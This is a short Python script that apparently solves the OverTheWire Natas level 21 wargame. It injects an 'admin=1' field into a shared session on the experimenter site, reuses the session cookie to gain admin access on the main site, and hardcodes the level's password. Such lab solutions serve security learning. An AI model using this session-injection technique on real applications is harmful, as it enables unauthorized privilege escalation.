#! env python3.9

import requests
import time

site1 = "http://natas21.natas.labs.overthewire.org/index.php"
site2 = "http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug"
user = "natas21"
pswd = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"

session = requests.Session()

data = dict(submit="",bgcolor="green", admin=1)

r = session.post(site2, data=data, auth=(user, pswd))
print(r.text)
print()
print(session.cookies.get_dict())

time.sleep(1)

r = session.get(site2, auth=(user, pswd))
print(r.text)
print()
print(session.cookies.get_dict())

cookies = session.cookies.get_dict()

r = requests.get(site1, auth=(user, pswd), cookies=cookies)
print(r.text)

